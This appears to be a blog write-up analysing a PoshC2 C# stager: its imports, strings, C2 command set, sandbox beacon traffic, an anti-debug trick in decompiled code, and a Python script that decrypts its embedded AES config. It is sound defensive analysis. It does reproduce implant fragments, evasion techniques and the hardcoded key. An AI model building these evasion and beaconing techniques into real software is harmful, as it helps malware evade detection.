+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="ln">1</span><span class="cl">SHA256      8E5EEB667A962DBEE803572F951D08A65C67A42ECB6D6EAF8EBAAF3681E26154
+</span></span><span class="line"><span class="ln">2</span><span class="cl">Family      PoshC2 — C# implant
+</span></span><span class="line"><span class="ln">3</span><span class="cl">C2          https://192.168.248.128
+</span></span><span class="line"><span class="ln">4</span><span class="cl">URI         /vfe01s/1/vsopts.js/?c
+</span></span><span class="line"><span class="ln">5</span><span class="cl">BeaconSleep 5s ± 20% jitter
+</span></span><span class="line"><span class="ln">6</span><span class="cl">KillDate    2999-01-01
+</span></span><span class="line"><span class="ln">7</span><span class="cl">Encryption  AES-CBC, 256-bit key</span></span></code></pre></div></div>
+
+<h3 class="relative group"><span style="color:red">initial analysis</span>
+    <div id="initial-analysis" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#initial-analysis" aria-label="Anchor">#</a>
+    </span>
+    
+</h3>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="ln">1</span><span class="cl"><span class="gp">$</span> file *
+</span></span><span class="line"><span class="ln">2</span><span class="cl"><span class="go">dropper_cs.exe: PE32 executable for MS Windows 4.00 (console), Intel i386 Mono/.Net assembly, 3 sections
+</span></span></span></code></pre></div></div>
+<p>SHA256: 8E5EEB667A962DBEE803572F951D08A65C67A42ECB6D6EAF8EBAAF3681E26154</p>
+
+<h4 class="relative group">libraries
+    <div id="libraries" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#libraries" aria-label="Anchor">#</a>
+    </span>
+    
+</h4>
+<p>Confirmed that is .NET executable by seen a huge amount of <code>mscoree.dl</code> (Microsoft .NET Runtime Execution Engine)
+<figure><img
+    class="my-0 rounded-md"
+    loading="lazy"
+    decoding="async"
+    fetchpriority="auto"
+    alt="alt text"
+    width="668"
+    height="110"
+    src="/bubka/writeups/dropper-cs.exe-analysis/image.png"
+    srcset="/bubka/writeups/dropper-cs.exe-analysis/image.png 800w, /bubka/writeups/dropper-cs.exe-analysis/image.png 1280w"
+    sizes="(min-width: 768px) 50vw, 65vw"
+    data-zoom-src="/bubka/writeups/dropper-cs.exe-analysis/image.png"></figure>
+</p>
+
+<h4 class="relative group">imports
+    <div id="imports" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#imports" aria-label="Anchor">#</a>
+    </span>
+    
+</h4>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="ln">1</span><span class="cl">VirtualProtect                              KERNEL32.dll
+</span></span><span class="line"><span class="ln">2</span><span class="cl">GetCurrentThread                            KERNEL32.dll
+</span></span><span class="line"><span class="ln">3</span><span class="cl">TerminateThread                             KERNEL32.dll
+</span></span><span class="line"><span class="ln">4</span><span class="cl">GetConsoleWindow                            KERNEL32.dll</span></span></code></pre></div></div>
+<p>- <code>VirtualProtect + PAGE_EXECUTE_READWRITE</code> field: marks memory regions as executable, shellcode injection technique<br>
+- <code>GetConsoleWindow + ShowWindow(SW_HIDE)</code>: hides console window from user</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="ln">1</span><span class="cl">Load                                        mscoree.dll (runtime)
+</span></span><span class="line"><span class="ln">2</span><span class="cl">CreateDomain, DoCallBack, Unload            mscoree.dll (runtime)
+</span></span><span class="line"><span class="ln">3</span><span class="cl">RunEphemeralAssembly, ActivateLoader        mscoree.dll (runtime)
+</span></span><span class="line"><span class="ln">4</span><span class="cl">RunTempAppDomain, RunAssembly               mscoree.dll (runtime)</span></span></code></pre></div></div>
+<p>- loads and executes assemblies directly from bytes, never touching disk</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="ln">1</span><span class="cl">Beacon, BeaconSleepMillis, Jitter           mscoree.dll (C2 logic)
+</span></span><span class="line"><span class="ln">2</span><span class="cl">GenerateUri, StageUrl, URIs                 mscoree.dll (C2 logic)
+</span></span><span class="line"><span class="ln">3</span><span class="cl">GetCommands, SendTaskOutputString           mscoree.dll (C2 logic)
+</span></span><span class="line"><span class="ln">4</span><span class="cl">DownloadString, UploadData                  System.Net (WebClient)</span></span></code></pre></div></div>
+<p>- <code>beacon loop</code>: sleep with jitter -&gt; contact C2 -&gt; receive commands -&gt; send output<br>
+- <code>GenerateUri</code>: randomizes request URLs to evade pattern-based detection</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="ln">1</span><span class="cl">ProxyUrl, ProxyUser, ProxyPassword          mscoree.dll (config)
+</span></span><span class="line"><span class="ln">2</span><span class="cl">UserAgent, HttpReferrer                     mscoree.dll (config)
+</span></span><span class="line"><span class="ln">3</span><span class="cl">set_ServerCertificateValidationCallback     System.Net
+</span></span><span class="line"><span class="ln">4</span><span class="cl">AllowUntrustedCertificates                  mscoree.dll</span></span></code></pre></div></div>
+<p>- custom User-Agent, Referrer, proxy support<br>
+- SSL certificate validation disabled: allows self-signed C2 certs, MITM-friendly</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="ln">1</span><span class="cl">PadWithImageData, ImageDataObfuscator       mscoree.dll (C2 logic)
+</span></span><span class="line"><span class="ln">2</span><span class="cl">Images, ExtractImages                       mscoree.dll (config)</span></span></code></pre></div></div>
+<p>- steganography: C2 traffic disguised as image data</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="ln">1</span><span class="cl">RijndaelManaged, AesCryptoServiceProvider   System.Security.Cryptography
+</span></span><span class="line"><span class="ln">2</span><span class="cl">Encrypt, Decrypt, CreateEncryptor           mscoree.dll
+</span></span><span class="line"><span class="ln">3</span><span class="cl">Key, GenerateIV                             mscoree.dll</span></span></code></pre></div></div>
+<p>- <code>AES</code> encryption of all C2 traffic</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="ln">1</span><span class="cl">GetEnvironmentalInfo, GetCurrentProcess     mscoree.dll / System.Diagnostics
+</span></span><span class="line"><span class="ln">2</span><span class="cl">get_UserName, get_UserDomainName            System
+</span></span><span class="line"><span class="ln">3</span><span class="cl">IsHighIntegrity, WindowsPrincipal.IsInRole  System.Security.Principal
+</span></span><span class="line"><span class="ln">4</span><span class="cl">GetEnvironmentVariable                      System</span></span></code></pre></div></div>
+<p>- system reconnaissance: username, domain, process name, PID<br>
+- IsHighIntegrity: checks for admin/SYSTEM privileges</p>
+
+<h4 class="relative group">strings
+    <div id="strings" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#strings" aria-label="Anchor">#</a>
+    </span>
+    
+</h4>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="ln">1</span><span class="cl">PAGE_EXECUTE_READWRITE        
+</span></span><span class="line"><span class="ln">2</span><span class="cl">SW_HIDE                        
+</span></span><span class="line"><span class="ln">3</span><span class="cl">MULTI_COMMAND_PREFIX          
+</span></span><span class="line"><span class="ln">4</span><span class="cl">COMMAND_SEPARATOR             </span></span></code></pre></div></div>
+<p>- <code>PAGE_EXECUTE_READWRITE</code> - VirtualProtect constant, confirms shellcode injection capability<br>
+- <code>SW_HIDE</code> — hides console window on startup<br>
+- <code>MULTI_COMMAND_PREFIX</code> / <code>COMMAND_SEPARATOR</code> — supports batched command execution from C2</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="ln">1</span><span class="cl">reversedBase64Config  
+</span></span><span class="line"><span class="ln">2</span><span class="cl">!d-3dion@LD!-d                 hardcoded key (used in PoshC2) 
+</span></span><span class="line"><span class="ln">3</span><span class="cl">==wFR4yT0nuXyBLNH...           reversed base64 ~600 chars (offset 0x04B25DE9)
+</span></span><span class="line"><span class="ln">4</span><span class="cl">sI1bBV0hgqeoBBbXa/KqQx8...     base64 (offset 0x04B2629C)</span></span></code></pre></div></div>
+<p>- large reversed  base64 blob (~600 chars) — <strong>embedded encrypted C2 configuration</strong></p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="ln"> 1</span><span class="cl">run-exe                         command
+</span></span><span class="line"><span class="ln"> 2</span><span class="cl">run-dll                         command
+</span></span><span class="line"><span class="ln"> 3</span><span class="cl">run-temp-appdomain              command
+</span></span><span class="line"><span class="ln"> 4</span><span class="cl">update-config                   command
+</span></span><span class="line"><span class="ln"> 5</span><span class="cl">load-module                     command
+</span></span><span class="line"><span class="ln"> 6</span><span class="cl">run-dll-background              command
+</span></span><span class="line"><span class="ln"> 7</span><span class="cl">run-exe-background              command
+</span></span><span class="line"><span class="ln"> 8</span><span class="cl">run-assembly-background         command
+</span></span><span class="line"><span class="ln"> 9</span><span class="cl">set-delegates                   command
+</span></span><span class="line"><span class="ln">10</span><span class="cl">download-file                   command
+</span></span><span class="line"><span class="ln">11</span><span class="cl">run-assembly                    command
+</span></span><span class="line"><span class="ln">12</span><span class="cl">beacon                          command
+</span></span><span class="line"><span class="ln">13</span><span class="cl">exit                            command
+</span></span><span class="line"><span class="ln">14</span><span class="cl">multicmd                        command prefix</span></span></code></pre></div></div>
+<p>- full <strong>C2 command dispatcher</strong> confirmed<br>
+- <code>run-assembly</code> / <code>run-exe</code> / <code>run-dll</code> — arbitrary in-memory code execution<br>
+- <code>run-*-background</code> — background task execution in separate threads<br>
+- <code>load-module</code> — dynamic loading of new modules pushed from C2<br>
+- <code>download-file</code> — exfiltration or additional staging<br>
+- <code>update-config</code> — <strong>live reconfiguration</strong></p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="ln">1</span><span class="cl">{0}/{1}{2}/?{3}                 URL format string
+</span></span><span class="line"><span class="ln">2</span><span class="cl">SessionID={0}                   cookie/param
+</span></span><span class="line"><span class="ln">3</span><span class="cl">Host                           
+</span></span><span class="line"><span class="ln">4</span><span class="cl">User-Agent                     
+</span></span><span class="line"><span class="ln">5</span><span class="cl">Referer                        </span></span></code></pre></div></div>
+<p>- URL template <code>{0}/{1}{2}/?{3}</code> — randomized C2 url generation to evade pattern detection<br>
+- <code>SessionID</code> in cookie — mimics legitimate web session to blend into normal traffic</p>
+<p><strong>Overall conclusion:</strong>
+Strings confirm and extend the picture from imports — this is a <strong>PoshC2 C# implant (Stager/Dropper)</strong>:</p>
+<ul>
+<li><strong>Two-stage architecture</strong>: this binary is the stager, loads <code>Stage2-Core.exe</code> entirely in memory</li>
+<li><strong>Embedded encrypted config</strong>: large base64 blob with C2 parameters, decoded via reverse + AES</li>
+<li><strong>Full command loop</strong>: 13+ commands including live config update and modular payload loading</li>
+<li><strong>Traffic masking</strong>: SessionID cookie, custom HTTP headers, randomized URL patterns</li>
+<li><strong>Operational security</strong>: KillDate enforced, temporary AppDomains, all operations fileless</li>
+</ul>
+
+<h4 class="relative group">running in Sandbox
+    <div id="running-in-sandbox" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#running-in-sandbox" aria-label="Anchor">#</a>
+    </span>
+    
+</h4>
+<p>Ran ANY.RUN sandbox with Fake Net enabled.
+Sample sends 2 HTTP requests over ~40 seconds (beacon interval).
+<figure><img
+    class="my-0 rounded-md"
+    loading="lazy"
+    decoding="async"
+    fetchpriority="auto"
+    alt="alt text"
+    width="1273"
+    height="211"
+    src="/bubka/writeups/dropper-cs.exe-analysis/image1_hu_1b606720a9a7ed84.png"
+    srcset="/bubka/writeups/dropper-cs.exe-analysis/image1_hu_1b606720a9a7ed84.png 800w, /bubka/writeups/dropper-cs.exe-analysis/image1.png 1280w"
+    sizes="(min-width: 768px) 50vw, 65vw"
+    data-zoom-src="/bubka/writeups/dropper-cs.exe-analysis/image1.png"></figure>
+
+- url pattern <code>/vfe01s/1/vsopts.js/?c</code> directly matches hardcoded format string <code>{0}/{1}{2}/?{3}</code></p>
+<p>HTTP Request:</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="ln"> 1</span><span class="cl">URL          /vfe01s/1/vsopts.js/?c
+</span></span><span class="line"><span class="ln"> 2</span><span class="cl">Protocol     HTTP/1.1
+</span></span><span class="line"><span class="ln"> 3</span><span class="cl">Method       GET
+</span></span><span class="line"><span class="ln"> 4</span><span class="cl">Cookie       SessionID=nINTTfojq1v9MITeQO+JRekWX1/+Nqc6/BMwBNX6MaW6Wr
+</span></span><span class="line"><span class="ln"> 5</span><span class="cl">             PdAzMWsLM/mYMLtMCokYOzh0jpmBMmDUCxfkytXVuMqxpQ/IECzNPp
+</span></span><span class="line"><span class="ln"> 6</span><span class="cl">             KiI2ia/3OdtLwM8Qjk6mdnBJyza
+</span></span><span class="line"><span class="ln"> 7</span><span class="cl">User-Agent   Mozilla/5.0 (Windows NT 10.0; Win64; x64)
+</span></span><span class="line"><span class="ln"> 8</span><span class="cl">             AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.122 Safari/537.36
+</span></span><span class="line"><span class="ln"> 9</span><span class="cl">Host         192.168.248.128
+</span></span><span class="line"><span class="ln">10</span><span class="cl">Connection   Keep-Alive</span></span></code></pre></div></div>
+<p>- uses legitimate Chrome User-Agent
+- this is the <strong>initial beacon fingerprint</strong> sent to C2 on first check-in</p>
+<p><figure><img
+    class="my-0 rounded-md"
+    loading="lazy"
+    decoding="async"
+    fetchpriority="auto"
+    alt="alt text"
+    width="756"
+    height="84"
+    src="/bubka/writeups/dropper-cs.exe-analysis/image2.png"
+    srcset="/bubka/writeups/dropper-cs.exe-analysis/image2.png 800w, /bubka/writeups/dropper-cs.exe-analysis/image2.png 1280w"
+    sizes="(min-width: 768px) 50vw, 65vw"
+    data-zoom-src="/bubka/writeups/dropper-cs.exe-analysis/image2.png"></figure>
+
+- outbound TCP to <code>192.168.248.128:443</code> initiated <strong>1288ms after process start</strong>
+- traffic over port 443 (HTTPS)</p>
+
+<h3 class="relative group"><span style="color:red">reversing in DNSpy</span>
+    <div id="reversing-in-dnspy" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#reversing-in-dnspy" aria-label="Anchor">#</a>
+    </span>
+    
+</h3>
+<p>Started analysis from <code>Main()</code> function, which calls <code>Sharp()</code>.</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c#" data-lang="c#"><span class="line"><span class="ln">1</span><span class="cl"><span class="kd">public</span> <span class="kd">static</span> <span class="k">void</span> <span class="n">Main</span><span class="p">()</span>
+</span></span><span class="line"><span class="ln">2</span><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="ln">3</span><span class="cl">    <span class="n">Program</span><span class="p">.</span><span class="n">Sharp</span><span class="p">(</span><span class="m">0L</span><span class="p">,</span> <span class="m">0L</span><span class="p">);</span>
+</span></span><span class="line"><span class="ln">4</span><span class="cl"><span class="p">}</span></span></span></code></pre></div></div>
+
+<h4 class="relative group">anti-analysis
+    <div id="anti-analysis" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#anti-analysis" aria-label="Anchor">#</a>
+    </span>
+    
+</h4>
+<p>The <code>Sharp()</code> function starts by hiding the console window.</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c#" data-lang="c#"><span class="line"><span class="ln">1</span><span class="cl"><span class="kd">public</span> <span class="kd">static</span> <span class="k">void</span> <span class="n">Sharp</span><span class="p">(</span><span class="kt">long</span> <span class="n">callbackFunc</span> <span class="p">=</span> <span class="m">0L</span><span class="p">,</span> <span class="kt">long</span> <span class="n">baseAddress</span> <span class="p">=</span> <span class="m">0L</span><span class="p">)</span>
+</span></span><span class="line"><span class="ln">2</span><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="ln">3</span><span class="cl">    <span class="n">Internals</span><span class="p">.</span><span class="n">ShowWindow</span><span class="p">(</span><span class="n">Internals</span><span class="p">.</span><span class="n">GetConsoleWindow</span><span class="p">(),</span> <span class="m">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="ln">4</span><span class="cl">    <span class="kt">byte</span><span class="p">[]</span> <span class="n">array</span> <span class="p">=</span> <span class="k">new</span> <span class="kt">byte</span><span class="p">[</span><span class="m">0</span><span class="p">];</span>
+</span></span><span class="line"><span class="ln">5</span><span class="cl"><span class="p">...[</span><span class="n">snip</span><span class="p">]...</span></span></span></code></pre></div></div>
+<p>Next it performs an anti-debug technique using a throw/catch exception. if the debugger is <strong>not</strong> attached, it triggers a divide-by-zero exception, which is caught by the <code>catch (Exception)</code> block where the main code begins execution. if the debugger <strong>is</strong> attached — no exception is thrown and the implant proceeds with an empty config, effectively disabling itself.</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c#" data-lang="c#"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="k">try</span>
+</span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="ln"> 3</span><span class="cl">    <span class="n">IntPtr</span> <span class="n">intPtr</span> <span class="p">=</span> <span class="k">new</span> <span class="n">IntPtr</span><span class="p">(</span><span class="m">0L</span><span class="p">);</span>
+</span></span><span class="line"><span class="ln"> 4</span><span class="cl">    <span class="kt">long</span> <span class="n">num</span><span class="p">;</span>
+</span></span><span class="line"><span class="ln"> 5</span><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">Debugger</span><span class="p">.</span><span class="n">IsAttached</span><span class="p">)</span>
+</span></span><span class="line"><span class="ln"> 6</span><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="ln"> 7</span><span class="cl">        <span class="n">num</span> <span class="p">=</span> <span class="n">baseAddress</span><span class="p">;</span>
+</span></span><span class="line"><span class="ln"> 8</span><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="ln"> 9</span><span class="cl">    <span class="k">else</span>
+</span></span><span class="line"><span class="ln">10</span><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="ln">11</span><span class="cl">        <span class="n">num</span> <span class="p">=</span> <span class="n">baseAddress</span> <span class="p">/</span> <span class="n">intPtr</span><span class="p">.</span><span class="n">ToInt64</span><span class="p">();</span> <span class="c1">// intentional divide-by-zero</span>
+</span></span><span class="line"><span class="ln">12</span><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="ln">13</span><span class="cl">    <span class="n">array</span> <span class="p">=</span> <span class="n">Encoding</span><span class="p">.</span><span class="n">BigEndianUnicode</span><span class="p">.</span><span class="n">GetBytes</span><span class="p">(</span><span class="n">num</span><span class="p">.</span><span class="n">ToString</span><span class="p">());</span>
+</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="k">catch</span> <span class="p">(</span><span class="n">Exception</span><span class="p">)</span>
+</span></span><span class="line"><span class="ln">16</span><span class="cl"><span class="p">...[</span><span class="n">snip</span><span class="p">]...</span></span></span></code></pre></div></div>
+<p>Inside the catch block, the <code>Config()</code> constructor is initialized with hardcoded encrypted data.</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c#" data-lang="c#"><span class="line"><span class="ln">1</span><span class="cl"><span class="k">try</span>
+</span></span><span class="line"><span class="ln">2</span><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="ln">3</span><span class="cl"><span class="p">...[</span><span class="n">snip</span><span class="p">]...</span>
+</span></span><span class="line"><span class="ln">4</span><span class="cl">    <span class="n">Config</span> <span class="n">config</span> <span class="p">=</span> <span class="k">new</span> <span class="n">Config</span><span class="p">(</span><span class="s">&#34;==wFR4yT0nuXyBLNHGAHcm51H/B3CjLNxlp6/k3YhokMiGKy4cWkNtmW6Werm1nHWI4yPTbEchk4pGl54J4YH+d43Edan+kOVjPF/wMkpp7Jc3uXiBjCNEJSQNlNHL6ouI06gjISjsdqPTcLLN2JKAxYLSDtAUkarsF6AVXWknO4DYtUCO2xvwQvf43y4cdLNpuDhVUZv1P3emAcfl1EEA83qYGqIxiJsXvaVR/Nxgrl2/jqVO9XtBEMRkJgP/3JrTPgxp3P3kqIu0/WZvp7YApAXQTO8HRir077rNlcXOxqo1/jVsMTSSk3yiIv7nvmQfyMM/fCTp3o4Oeo6Bq/8/A3RH6gPB4sqNXhU4kVSQerYkP4dSKrKR+jfDYfKqr26TQuduOTcEI9E3tVvZXvZaWqDVUtvFdLviPO89B4Uzs5Wz9S709m91DLFgU0PDlubKyTPmR1qyM4JclfJbW9a60YdYsIm346hq38+Y2IHroOJUhmufrnXAHeX0yTmGq8nNGDpnQm8DpGm4At4MjdSgK0YW6HRWRYB4yoU07cv4hvZPvhXCChNk+fl4i9RDwcj7YtrY7fR4Nw+1us/nE6fsfM&#34;</span><span class="p">,</span> <span class="s">&#34;sI1bBV0hgqeoBBbXa/KqQx8FSWe/jqKFF9TBxehGxxc=&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="ln">5</span><span class="cl">    <span class="n">Program</span><span class="p">.</span><span class="n">Init</span><span class="p">(</span><span class="n">config</span><span class="p">);</span>
+</span></span><span class="line"><span class="ln">6</span><span class="cl"><span class="p">...[</span><span class="n">snip</span><span class="p">]...</span>
+</span></span><span class="line"><span class="ln">7</span><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="ln">8</span><span class="cl"><span class="k">catch</span> <span class="p">(</span><span class="n">Exception</span> <span class="n">ex</span><span class="p">)</span></span></span></code></pre></div></div>
+<p><code>Config(config, key)</code> receives the encrypted config as a reversed base64 string. the string is first reversed, then passed along with the key to <code>Decrypt()</code>. the decrypted result contains another base64 string which is decoded again, producing plaintext that is passed to <code>ParseConfigString()</code>.
+<figure><img
+    class="my-0 rounded-md"
+    loading="lazy"
+    decoding="async"
+    fetchpriority="auto"
+    alt="alt text"
+    width="949"
+    height="242"
+    src="/bubka/writeups/dropper-cs.exe-analysis/image4_hu_a422f357fbc5fcd1.png"
+    srcset="/bubka/writeups/dropper-cs.exe-analysis/image4_hu_a422f357fbc5fcd1.png 800w, /bubka/writeups/dropper-cs.exe-analysis/image4.png 1280w"
+    sizes="(min-width: 768px) 50vw, 65vw"
+    data-zoom-src="/bubka/writeups/dropper-cs.exe-analysis/image4.png"></figure>
+</p>
+<p><code>Decrypt()</code> extracts the first 16 bytes from the decrypted data as the IV, then constructs the cipher via <code>CreateAlgorithm(key, iv)</code>.
+<figure><img
+    class="my-0 rounded-md"
+    loading="lazy"
+    decoding="async"
+    fetchpriority="auto"
+    alt="alt text"
+    width="1096"
+    height="421"
+    src="/bubka/writeups/dropper-cs.exe-analysis/image5_hu_f301c55599a3547d.png"
+    srcset="/bubka/writeups/dropper-cs.exe-analysis/image5_hu_f301c55599a3547d.png 800w, /bubka/writeups/dropper-cs.exe-analysis/image5.png 1280w"
+    sizes="(min-width: 768px) 50vw, 65vw"
+    data-zoom-src="/bubka/writeups/dropper-cs.exe-analysis/image5.png"></figure>
+</p>
+<p><code>CreateAlgorithm()</code> implements AES-CBC with a 128-bit block size and 256-bit key.
+<figure><img
+    class="my-0 rounded-md"
+    loading="lazy"
+    decoding="async"
+    fetchpriority="auto"
+    alt="alt text"
+    width="914"
+    height="556"
+    src="/bubka/writeups/dropper-cs.exe-analysis/image6_hu_d4bc67f723dc3a90.png"
+    srcset="/bubka/writeups/dropper-cs.exe-analysis/image6_hu_d4bc67f723dc3a90.png 800w, /bubka/writeups/dropper-cs.exe-analysis/image6.png 1280w"
+    sizes="(min-width: 768px) 50vw, 65vw"
+    data-zoom-src="/bubka/writeups/dropper-cs.exe-analysis/image6.png"></figure>
+</p>
+<p>To extract the plaintext config, a Python script was written to replicate the C# decryption logic:
+- reverse the base64 string
+- decode base64 → ciphertext bytes
+- first 16 bytes = IV, remaining bytes = ciphertext
+- decode key from base64
+- decrypt using AES-CBC
+- decode result as base64 once more to get plaintext config</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="kn">from</span> <span class="nn">Crypto.Cipher</span> <span class="kn">import</span> <span class="n">AES</span>
+</span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="kn">import</span> <span class="nn">base64</span>
+</span></span><span class="line"><span class="ln"> 3</span><span class="cl">
+</span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="n">rev_b64</span> <span class="o">=</span> <span class="p">(</span><span class="s2">&#34;==wFR4yT0nuXyBL...fsfM&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="n">b64_key</span> <span class="o">=</span> <span class="s2">&#34;sI1bBV0hgqeoBBbXa/KqQx8FSWe/jqKFF9TBxehGxxc=&#34;</span>
+</span></span><span class="line"><span class="ln"> 6</span><span class="cl">
+</span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="n">b64</span> <span class="o">=</span> <span class="n">rev_b64</span><span class="p">[::</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
+</span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="n">ciphertext</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">b64</span><span class="p">)</span>
+</span></span><span class="line"><span class="ln"> 9</span><span class="cl">
+</span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="n">iv</span> <span class="o">=</span> <span class="n">ciphertext</span><span class="p">[:</span><span class="mi">16</span><span class="p">]</span>
+</span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="n">ct</span> <span class="o">=</span> <span class="n">ciphertext</span><span class="p">[</span><span class="mi">16</span><span class="p">:]</span>
+</span></span><span class="line"><span class="ln">12</span><span class="cl">
+</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="n">key</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">b64_key</span><span class="p">)</span>
+</span></span><span class="line"><span class="ln">14</span><span class="cl">
+</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="n">cipher</span> <span class="o">=</span> <span class="n">AES</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="n">AES</span><span class="o">.</span><span class="n">MODE_CBC</span><span class="p">,</span> <span class="n">iv</span><span class="p">)</span>
+</span></span><span class="line"><span class="ln">16</span><span class="cl"><span class="n">dec</span> <span class="o">=</span> <span class="n">cipher</span><span class="o">.</span><span class="n">decrypt</span><span class="p">(</span><span class="n">ct</span><span class="p">)</span>
+</span></span><span class="line"><span class="ln">17</span><span class="cl">
+</span></span><span class="line"><span class="ln">18</span><span class="cl"><span class="n">dec</span> <span class="o">=</span> <span class="n">dec</span><span class="o">.</span><span class="n">rstrip</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="ln">19</span><span class="cl"><span class="n">text</span> <span class="o">=</span> <span class="n">dec</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="ln">20</span><span class="cl"><span class="n">raw</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">text</span><span class="p">)</span>
+</span></span><span class="line"><span class="ln">21</span><span class="cl"><span class="n">config</span> <span class="o">=</span> <span class="n">raw</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="ln">22</span><span class="cl">
+</span></span><span class="line"><span class="ln">23</span><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">+-------------------------+&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="ln">24</span><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">config</span><span class="p">)</span>
+</span></span><span class="line"><span class="ln">25</span><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;+--------------------------------+&#34;</span><span class="p">)</span></span></span></code></pre></div></div>
+
